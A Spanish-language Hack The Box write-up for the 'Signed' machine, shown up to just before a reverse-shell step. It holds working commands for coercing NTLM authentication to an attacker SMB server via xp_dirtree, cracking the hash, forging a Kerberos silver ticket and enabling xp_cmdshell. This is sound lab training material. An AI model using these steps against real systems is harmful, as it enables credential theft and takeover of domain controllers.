---
title: "Signed - Hack The Box"
date: 2025-10-18
draft: false
slug: "htb-writeup-signed"
excerpt: "Esta fue una máquina bastante complicada y talachuda. Después de analizar los escaneos y de solo ver el puerto 1433 abierto, que es el servicio MSSQL, comprobamos la credencial dada y lo enumeramos. Al no encontrar algo útil, decidimos aplicar el NTLM Relay Attack, logrando capturar un Hash NTLM de un usuario. Crackeamos el Hash y nos volvemos a conectar al MSSQL como este nuevo usuario. Aunque este usuario tiene un poco más de privilegios, no tiene los suficientes para habilitar la función xp_cmdshell, por lo que decidimos aplicar un Silver Ticket Attack para meter a nuestro usuario a un grupo con mayores privilegios. Creamos el Silver Ticket y al conectarnos de nuevo al MSSQL, ya nos deja ejecutar comandos con la función xp_cmdshell, que usamos para cargar el binario nc.exe y así logramos conectarnos a la máquina víctima. Al no encontrar una forma de escalar privilegios, investigamos un poco y vemos que es posible leer archivos privilegiados con la función OPENROWSET. Aunque nuestra sesión nos permite habilitar y usar esta función, no nos permite leer los archivos que deseamos, así que volvemos a crear un Silver Ticket, pero agregando a nuestro usuario a 2 grupos llamados Domain Admins y Enterprise Admins. Nos autenticamos con el nuevo ticket y ya nos permite leer cualquier archivo, siendo así que leemos el historial de comandos del usuario Administrador, encontrando su contraseña en texto claro, que usamos en conjunto con la herramienta RunasCs para obtener una sesión del Administrador, logrando escalar privilegios."
categories: ["HackTheBox", "Medium Machine"]
tags: ["Windows", "Active Directory", "MSSQL", "MSSQL Enumeration", "NTLM Relay Attack", "Cracking Hash", "Cracking NTLM Hash", "Silver Ticket Attack", "Enabling xp_cmdshell(RCE)", "Reverse Shell with nx.exe Binary", "Arbitrary File Read", "Enabling OPENROWSET(BULK) Function On MSSQL (Arbitrary File Read)", "Reading PowerShell Command History", "Plaintext Password", "Privesc - Reading PowerShell Command History", "Reverse Shell with RunasCs Binary", "Privesc - Reverse Shell with RunasCs Binary", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "nxc"
  - "impacket-mssqlclient"
  - "responder"
  - "impacket-smbserver"
  - "JohnTheRipper"
  - "python3"
  - "echo"
  - "tr"
  - "iconv"
  - "openssl"
  - "impacket-ticketer"
  - "export"
  - "xp_cmdshell"
  - "locate"
  - "cp"
  - "certutil"
  - "rlwrap"
  - "nc"
  - "type"
  - "powershell"
  - "OPENROWSET(BULK)"
  - "RunasCs.exe"
links:
  - "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html#manual-enumeration"
  - "https://swisskyrepo.github.io/InternalAllTheThings/databases/mssql-enumeration/"
  - "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html#steal-netntlm-hash--relay-attack"
  - "https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver"
  - "https://www.hackingarticles.in/domain-persistence-silver-ticket-attack/"
  - "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/silver-ticket.html#example-mssql-service-mssqlsvc--potato-to-system"
  - "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/abusing-ad-mssql.html#mssql-basic-hacking-tricks"
  - "https://codebeautify.org/ntlm-hash-generator"
  - "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html#read-file-with-openrowset"
  - "https://code-white.com/blog/2015-06-reading-and-writing-files-with-mssql-openrowset/"
  - "https://www.mssqltips.com/sqlservertip/1643/using-openrowset-to-read-large-files-into-sql-server/"
  - "https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MSSQL%20Injection/#mssql-file-manipulation"
  - "https://github.com/antonioCoco/RunasCs"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-signed/signed.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.11.90
PING 10.10.11.90 (10.10.11.90) 56(84) bytes of data.
64 bytes from 10.10.11.90: icmp_seq=1 ttl=127 time=72.0 ms
64 bytes from 10.10.11.90: icmp_seq=2 ttl=127 time=614 ms
64 bytes from 10.10.11.90: icmp_seq=3 ttl=127 time=72.1 ms
64 bytes from 10.10.11.90: icmp_seq=4 ttl=127 time=72.6 ms

--- 10.10.11.90 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3002ms
rtt min/avg/max/mdev = 71.972/207.574/613.633/234.438 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.90 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-18 12:30 CST
Initiating SYN Stealth Scan at 12:30
Scanning 10.10.11.90 [65535 ports]
Discovered open port 1433/tcp on 10.10.11.90
Completed SYN Stealth Scan at 12:30, 29.71s elapsed (65535 total ports)
Nmap scan report for 10.10.11.90
Host is up, received user-set (0.32s latency).
Scanned at 2025-10-18 12:30:18 CST for 30s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  REASON
1433/tcp open  ms-sql-s syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 29.80 seconds
           Raw packets sent: 131076 (5.767MB) | Rcvd: 9 (388B)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solamente hay un puerto abierto, siendo el **puerto 1433** que pertenece al **servicio MSSQL**.

Esto también nos está diciendo que nos estamos enfrentando a una máquina con **Active Directory**, pues este puerto es común en estos ambientes.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 1433 10.10.11.90 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-18 12:32 CST
Nmap scan report for signed.htb (10.10.11.90)
Host is up (0.073s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM

|_ssl-date: 2025-10-18T18:37:29+00:00; +5m06s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-18T18:20:53
|_Not valid after:  2055-10-18T18:20:53
| ms-sql-info: 
|   10.10.11.90:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.10.11.90:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763

Host script results:

|_clock-skew: mean: 5m05s, deviation: 0s, median: 5m05s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.92 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Tenemos bastante información:
* Confirmamos que estamos ante un **AD**, pues la versión del **servicio MSSQL** es **Microsoft SQL Server 2022**.
* También sabemos que es una máquina **AD** porque el escaneo nos muestra su dominio, que vamos a registrar en el archivo `/etc/hosts`:
```bash
echo "10.10.11.90 signed.htb DC01.signed.htb" >> /etc/hosts
```
Entonces toda la intrusión será por el **servicio MSSQL**, pues igual tenemos un usuario y contraseña que podemos usar.

Vamos a probar esas credenciales.

## Análisis de Vulnerabilidades {#Analisis}

### Enumeración del Servicio MSSQL {#MSSQL}

Primero que nada, comprobemos que las credenciales funcionan con la herramienta **netexec**:
```bash
nxc mssql 10.10.11.90 -u 'scott' -p 'Sm230#C5NatH' --local-auth
MSSQL       10.10.11.90     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.10.11.90     1433   DC01             [+] DC01\scott:Sm230#C5NatH
```
Excelente, si funcionan.

Usemos la herramienta **mssqlclient** de la **suit de Impacket** para conectarnos al **MSSQL**:
```batch
impacket-mssqlclient 'signed.htb/scott:Sm230#C5NatH'@10.10.11.90
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (scott  guest@master)>
```
Estamos dentro.

Entramos como un **usuario guest** en la base de datos e igual lo comprobamos con la siguiente query:
```batch
SQL (scott  guest@master)> select user_name();
        
-----   
guest
```

Tratemos de activar la **cmdshell** de **MSSQL**:
```batch
SQL (scott  guest@master)> enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
```
No tenemos los permisos necesarios.

Veamos si hay más bases de datos:
```batch
SQL (scott  guest@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   

tempdb                   0   

model                    0   

msdb                     1
```
Solamente las de defecto.

Por último, veamos en qué DB nos encontramos y qué privilegios tenemos:
```batch
SQL (scott  guest@master)> SELECT DB_NAME();
         
------   
master

SQL (scott  guest@master)> SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
entity_name   subentity_name   permission_name                             
-----------   --------------   -----------------------------------------   
database                       CONNECT                                     

database                       VIEW ANY COLUMN ENCRYPTION KEY DEFINITION   

database                       VIEW ANY COLUMN MASTER KEY DEFINITION
```
Estamos dentro de la BD **master** y no tenemos muchos privilegios, solo podemos consultar pocas cosas como ver la definición de claves de cifrado (metadatos) y ver definiciones de claves maestras (solo estructura).

De ahí en fuera no hay algo más que podamos hacer.

Sin embargo, existe un ataque que podemos aplicar llamado **NTLM Relay Attack**.

Intentemos aplicarlo.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando NTLM Relay Attack para Capturar Hashes NTLM de Usuario con Mayores Privilegios {#NTLMrelay}

Expliquemos primero que es un **NTLM Relay Attack**:

| **NTLM Relay Attack** |
|:---------------------:|
| *Un NTLM Relay attack es un ataque de reenvío (relay) en el que un atacante intercepta una autenticación NTLM de un cliente legítimo hacia un servicio y la reutiliza (relaya) inmediatamente ante otro servicio objetivo para autenticarse con los privilegios del usuario original, sin conocer la contraseña en claro.* |

La biblia de **HackTricks** nos indica como podemos aplicarlo:
* <a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html#steal-netntlm-hash--relay-attack" target="_blank">HackTricks: 1433 Pentesting MSSQL - Steal NetNTLM hash / Relay attack</a>

Para que el ataque funcione, necesitamos comprobar que dentro de la máquina está activo el comando **xp_dirtree** y si nuestro usuario puede usarlo.

Comprobemos si está activo el comando **xp_dirtree** usando las siguientes queries:
* `Use master;` -> Para usar la base de datos **master**. Esta BD realiza un seguimiento de toda la información del sistema para una instancia de servidor SQL.
* `EXEC sp_helprotect 'xp_dirtree';` -> Usamos el comando **sp_helprotect** para mostrar entradas de permisos (**grants/denies**) para el objeto especificado, en este caso, del comando **xp_dirtree**.

Ejecútalas:
```batch
SQL (scott  guest@master)> Use master;
ENVCHANGE(DATABASE): Old Value: master, New Value: master
INFO(DC01): Line 1: Changed database context to 'master'.
SQL (scott  guest@master)> EXEC sp_helprotect 'xp_dirtree';
Owner   Object       Grantee   Grantor   ProtectType   Action    Column   
-----   ----------   -------   -------   -----------   -------   ------   
sys     xp_dirtree   public    dbo       b'Grant     '   Execute   .   
```
Vemos que está activo el comando **xp_dirtree** y cualquier usuario que esté logueado lo puede usar (**public**).

También podemos usar una segunda opción con las siguientes queries:
* `SELECT OBJECT_ID('master..xp_dirtree') AS objid;` -> Devuelve el **object_id** interno de la BD master para el objeto **xp_dirtree**, que si devuelve un número entero, entonces existe y si regresa el dato **NULL**, no existe.
* `SELECT HAS_PERMS_BY_NAME('master..xp_dirtree','OBJECT','EXECUTE');` -> **HAS_PERMS_BY_NAME** comprueba si nuestra sesión actual tiene el permiso **EXECUTE** sobre el objeto **xp_dirtree**. Si devuelve 1, si tenemos permiso. Si devuelve 0, no tenemos permiso y si devulve **NULL**, entonces el objeto no existe.

Ejecútalas:
```batch
SQL (scott  guest@master)> SELECT OBJECT_ID('master..xp_dirtree') AS objid;
     objid   
----------   
-630944181   

SQL (scott  guest@master)> SELECT HAS_PERMS_BY_NAME('master..xp_dirtree','OBJECT','EXECUTE');
    
-   
1
```
De igual forma, vemos que está activo el comando **xp_dirtree** y tenemos permiso de usarlo.

Ahora bien, la duda entra en de quién obtendríamos el **Hash NTLM** al intentar capturarlo.

Normalmente, el intento de autenticación lo hará el proceso de **SQL Server** (que sería el **usuario mssqlsvc**) y, por tanto, se enviará la **autenticación NTLM** de esa cuenta de servicio / cuenta máquina (por ejemplo, **MACHINE$** o la cuenta de servicio configurada). 

Para capturar el **Hash NTLM** podemos usar la herramienta **responder** o **impacket-smbserver**.

Usemos ambas.

#### Capturando Hash NTLM con Responder {#responder}

Activa la herramienta **responder** usando tu interfaz de red (el comando necesita **permisos sudo**):
```bash
responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.

  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
...
```

Desde el **MSSQL**, realizamos una consulta con el comando **xp_dirtree** hacia nuestra máquina:
```batch
SQL (scott  guest@master)> xp_dirtree \\Tu_IP\
subdirectory   depth   file   
------------   -----   ----
```

Observa el **responder**:
```bash
[SMB] NTLMv2-SSP Client   : 10.10.11.90
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:4c274....
```
Capturamos el **Hash NTLM**, ya solo tenemos que crackear el Hash.

#### Capturando Hash NTLM con Impacket-Smbserver {#smbserver}

Usemos la herramienta **impacket-smbserver** para levantar un **servidor SMB** y ahí capturar el **Hash NTLM**:
```bash
impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B3... V:3.0
[*] Callback added for UUID 6BF... V:1.0
```

Desde el **MSSQL**, realizamos una consulta con el comando **xp_dirtree** hacia nuestro **servidor SMB**, consultando el directorio compartido:
```batch
SQL (scott  guest@master)> xp_dirtree \\Tu_IP\smbFolder
subdirectory   depth   file   
------------   -----   ----
```

Observa el **servidor SMB**:
```bash
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.90,63144)
[*] AUTHENTICATE_MESSAGE (SIGNED\mssqlsvc,DC01)
[*] User DC01\mssqlsvc authenticated successfully
[*] mssqlsvc::SIGNED:aaaaaaaaaaaaaaaa:50925......
[*] Closing down connection (10.10.11.90,63144)
[*] Remaining connections []
```
Capturamos el **Hash NTLM**, así que vamos a crackearlo.

#### Crackeando Hash NTLM y Conectandonos al Servicio MSSQL con Usuario mssqlsvc {#CrackHash}

Usaremos la herramienta **JohnTheRipper** para crackear el **Hash NTLM**:
```bash
john -w:/usr/share/wordlists/rockyou.txt mssqlsvc.hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**********     (mssqlsvc)     
1g 0:00:00:04 DONE (2025-10-18 14:29) 0.2409g/s 1081Kp/s 1081Kc/s 1081KC/s purcitititya..pupe066505878
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```
Tenemos la contraseña.

Comprobemos si esta contraseña funciona para autenticarnos en el **servicio MSSQL**:
```bash
nxc mssql 10.10.11.90 -u 'mssqlsvc' -p '**********'
MSSQL       10.10.11.90     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.10.11.90     1433   DC01             [+] SIGNED.HTB\mssqlsvc:**********
```
Excelente, si funciona.

Autentiquémonos:
```batch
impacket-mssqlclient 'signed.htb/mssqlsvc:**********'@10.10.11.90 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  guest@master)>
```
Ahora somos el **usuario mssqlsvc** en la máquina víctima.

### Creando un Silver Ticket para Conectarnos a la Máquina Víctima (Silver Ticket Attack) {#SilverTicket}

Veamos si con este usuario podemos activar la **xp_cmdshell**:
```batch
SQL (SIGNED\mssqlsvc  guest@master)> enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
```
No tenemos los privilegios suficientes todavía.

Veamos qué usuario somos dentro de la BD:
```batch
SQL (SIGNED\mssqlsvc  guest@master)> SELECT USER_NAME();
        
-----   
guest
```
Es por eso que no podemos activar la **xp_cmdshell**.

Podemos consultar los privilegios que tenemos dentro la BD:
```batch
SQL (SIGNED\mssqlsvc  guest@master)> SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
entity_name   subentity_name   permission_name                             
-----------   --------------   -----------------------------------------   
database                       CONNECT                                     

database                       VIEW ANY COLUMN ENCRYPTION KEY DEFINITION   

database                       VIEW ANY COLUMN MASTER KEY DEFINITION       

database                       VIEW SECURITY DEFINITION                    

database                       VIEW PERFORMANCE DEFINITION                 

database                       VIEW DEFINITION
```
Tenemos más permisos que con el **usuario scott**, siendo uno de interés el permiso **VIEW SECURITY DEFIITION** porque podemos ver metadatos de seguridad (roles, permisos, usuarios).

Veamos qué usuarios tienen máximos privilegios:
```batch
SQL (SIGNED\mssqlsvc  guest@master)> EXEC sp_helpsrvrolemember;
ServerRole   MemberName                                                                            MemberSID   
----------   -------------------------   -------------------------------------------------------------------   
sysadmin     sa                                                                                        b'01'   

sysadmin     SIGNED\IT                           b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'   

sysadmin     NT SERVICE\SQLWriter        b'010600000000000550000000732b9753646ef90356745cb675c3aa6cd6b4d28b'   

sysadmin     NT SERVICE\Winmgmt          b'0106000000000005500000005a048ddff9c7430ab450d4e7477a2172ab4170f4'   

sysadmin     NT SERVICE\MSSQLSERVER      b'010600000000000550000000e20f4fe7b15874e48e19026478c2dc9ac307b83e'   

sysadmin     NT SERVICE\SQLSERVERAGENT   b'010600000000000550000000dca88f14b79fd47a992a3d8943f829a726066357'
```
Hay varios, entre ellos vemos uno llamado **IT**, que además vemos su **SID** en hexadecimal.

Ver a este usuario dentro del rol **sysadmin** es curioso e interesante.

Podríamos intentar crear un **Silver Ticket** para suplantar a este usuario, pero no tenemos su contraseña, lo que nos dificulta este ataque.

Sin embargo, podríamos crear un **Silver Ticket** para obtener una sesión con nuestro **usuario mssqlsvc**, pero con los mismos privilegios que el **usuario IT**, aunque solo funcionaría si es un grupo más no un usuario.

Para realizar esto, necesitamos lo siguiente:
* Confirmar que el **usuario IT** es un grupo, más no un usuario.
* En caso de que sea un grupo, podríamos cumplir con los requisitos para crear un **Silver Ticket** que son:
	* El **SID** de nuestro **usuario mssqlsvc** y su **RID**.
        * El **RID** del **usuario/grupo IT**, que sería necesario obtener el **SID** para sacarle ese dato.
	* El nombre del dominio.
	* El **SPN** del dominio.
	* El **Hash NT** de la contraseña de nuestro **usuario mssqlsvc**.

Hagamos todos estos pasos para crear nuestro **Silver Ticket**, pero antes, vamos a poner la definición de algunos de estos elementos.

| **Service Principal Name (SPN)** |
|:--------------------------------:|
| *Es un identificador único que representa un servicio concreto en un dominio de Active Directory para autenticación Kerberos. Permite que un cliente solicite un ticket Kerberos (TGS) para autenticarse con un servicio específico. Se asocia a una cuenta de usuario o máquina en AD, que posee la clave (NT hash) usada para firmar y verificar tickets.* |

| **Security Identifier (SID)** |
|:-----------------------------:|
| *Es un identificador único que Windows asigna a cada usuario, grupo o principal. Windows usa el SID para control de acceso, no el nombre legible del usuario o grupo. Toda asignación de permisos, pertenencia a grupos y roles se hace mediante SID.* |

| **Relative Identifier (RID)** |
|:-----------------------------:|
| *Es la parte final del SID que identifica un objeto concreto dentro del dominio. Esta ubicado como el último número después del prefijo del dominio en un SID. Permite diferenciar usuarios/grupos dentro de un mismo dominio y en combinación con el domain SID, forma el SID completo de un principal.* |

Continuemos con la creación del **Silver Ticket**.

* Comprobemos si el **usuario IT** es un grupo:
```batch
SQL (SIGNED\mssqlsvc  guest@master)> SELECT name, type_desc FROM sys.server_principals WHERE name = 'SIGNED\IT';
name        type_desc       
---------   -------------   
SIGNED\IT   WINDOWS_GROUP
```
Muy bien, si es un grupo, pues esa descripción representa un grupo de **Windows** que tiene acceso a **SQL Server**. Además, puede ser un grupo local de la máquina o un grupo del dominio, siendo este un grupo de dominio.

* Obtengamos los **SID** del **grupo IT** y del **usuario mssqlsvc**:
```batch
SQL (SIGNED\mssqlsvc  guest@master)> SELECT master.sys.fn_varbintohexstr(SUSER_SID('IT')) AS hexsid;
hexsid                                                       
----------------------------------------------------------   
0x0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000
.
SQL (SIGNED\mssqlsvc  guest@master)> SELECT master.sys.fn_varbintohexstr(SUSER_SID('mssqlsvc')) AS hexsid;
hexsid                                                       
----------------------------------------------------------   
0x0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000
```
Los tenemos en formato hexadecimal.

* Para calcular y obtener el **SID**, ocuparemos el siguiente script que me ayudó a crear **ChatGPT**:

```bash
#!/usr/bin/env python3
# SIDconverter.py
# Uso:
#   python3 SIDconverter.py 0x010500000000000515000000...

import sys, re

def normalize_hex(s):
    if s is None:
        return None
    s = s.strip()
    # eliminar comillas si existen
    s = s.strip("\"' ")
    s = s.lower()
    # quitar prefijo 0x si existe
    if s.startswith("0x"):
        s = s[2:]
    # eliminar cualquier caracter que no sea hex (0-9 a-f)
    s = re.sub(r'[^0-9a-f]', '', s)
    # si longitud impar, anteponer un 0
    if len(s) % 2 == 1:
        s = "0" + s
    return s

def hex_to_sid_text(hexstr):
    b = bytes.fromhex(hexstr)
    if len(b) < 8:
        raise ValueError("SID demasiado corto")
    revision = b[0]
    subcount = b[1]
    identifier_authority = int.from_bytes(b[2:8], byteorder='big')
    subs = []
    for i in range(subcount):
        off = 8 + i*4
        if off+4 > len(b):
            raise ValueError("SID truncado: falta subauthority #%d" % (i+1))
        sub = int.from_bytes(b[off:off+4], byteorder='little')
        subs.append(str(sub))
    sid_text = "S-{}-{}".format(revision, identifier_authority)
    if subs:
        sid_text += "-" + "-".join(subs)
    return sid_text

def main():
    if len(sys.argv) > 1:
        raw = sys.argv[1]
    else:
        raw = input("Pega el sid hex (ej. 0x0105...) o sólo el hex: ").strip()
    norm = normalize_hex(raw)
    if not norm:
        print("No se proporcionó un valor hex válido.")
        return
    try:
        sid = hex_to_sid_text(norm)
    except Exception as e:
        print("Error convirtiendo SID:", e)
        return
    print("SID hex normalizado: {}".format(norm))
    print("SID textual: {}".format(sid))

if __name__ == "__main__":
    main()
```

* Probemos el script de **Python**:
```bash
python3 SIDconverter.py
Pega el sid hex (ej. 0x0105...) o sólo el hex: 0x0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000
SID hex normalizado: 0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000
SID textual: S-1-5-21-4088429403-1159899800-2753317549-1103
.                                                                                                                                                                                              
python3 SIDconverter.py
Pega el sid hex (ej. 0x0105...) o sólo el hex: 0x0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000
SID hex normalizado: 0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000
SID textual: S-1-5-21-4088429403-1159899800-2753317549-1105
```
Recuerda que el primer **SID** es del **usuario mssqlsvc** y el segundo **SID** es del **grupo IT**.

* Del **SID** obtenemos el **RID**:
```bash
# RID del usuario mssqlsvc
1103
.
# RID del grupo IT
1105
```

* Obtengamos el dominio de la máquina desde el **MSSQL**:
```batch
SQL (SIGNED\mssqlsvc  guest@master)> SELECT DEFAULT_DOMAIN() AS mydomain;
mydomain   
--------   
SIGNED
```

* Podemos obtener el **SPN** simplemente usando su sintaxis general:

```bash
# Sintaxis SPN
<servicetype>/<hostname>:<port>

# SPN del AD
MSSQLSvc/DC01.signed.htb:1433
```

* Para obtener el **Hash NT** de la contraseña del **usuario mssqlsvc** podemos usar la página web: <a href="https://codebeautify.org/ntlm-hash-generator" target="_blank">NTLM Hash Generator</a>.

<p align="center">
<img src="/assets/images/htb-writeup-signed/Captura1.png">
</p>

Solamente le dimos la contraseña y ya solo debemos cambiar el Hash a minúsculas:
```bash
echo "Hash NT" | tr '[A-Z]' '[a-z]'
...
```

* Otra opción para el **Hash NT** sería usar el comando **iconv** y **openssl**:
```bash
iconv -f ASCII -t UTF-16LE <(printf '**********') | openssl dgst -md4
MD4(stdin)= **********
```

Con todo esto listo, ya solamente tenemos que generar nuestro **Silver Ticket** con la herramienta **impacket-ticketer**:
```batch
impacket-ticketer -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 -user-id 1103 mssqlsvc -nthash **********
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/mssqlsvc
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
```
Fue un éxito la creación del **Silver Ticket**.

Exportamos el archivo **mssqlsvc.ccache** como una variable de entorno:
```bash
export KRB5CCNAME=mssqlsvc.ccache
```

Y nos conectamos al **MSSQL** usando ese ticket:
```batch
impacket-mssqlclient -k -no-pass DC01.SIGNED.HTB
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)>
```
Estamos dentro.

### Ganando Acceso a la Máquina Víctima con xp_cmdshell y Binario nc.exe {#xp_cmdshell}

Comprobemos con qué usuario nos logueamos al **MSSQL**:
```batch
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT USER_NAME();
      
---   
dbo
```
Excelente, somos el **usuario dbo**, es decir, que tenemos máximos privilegios.

También podemos comprobar si tenemos el rol **sysadmin**, que es el máximo rol en el **MSSQL** (este rol lo tiene el **usuario dbo**):
```batch
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
1
```
Tenemos este rol.

Entonces, ya podemos activar el **xp_cmdshell**:
```batch
SQL (SIGNED\mssqlsvc  dbo@master)> enable_xp_cmdshell
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Ya podemos ejecutar comandos con la función **xp_cmdshell**:
```batch
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "whoami"
output            
---------------   
signed\mssqlsvc
```

Vamos a obtener una sesión en la máquina víctima usando el binario **nc.exe**.

Busca y copia en tu directorio de trabajo este binario:
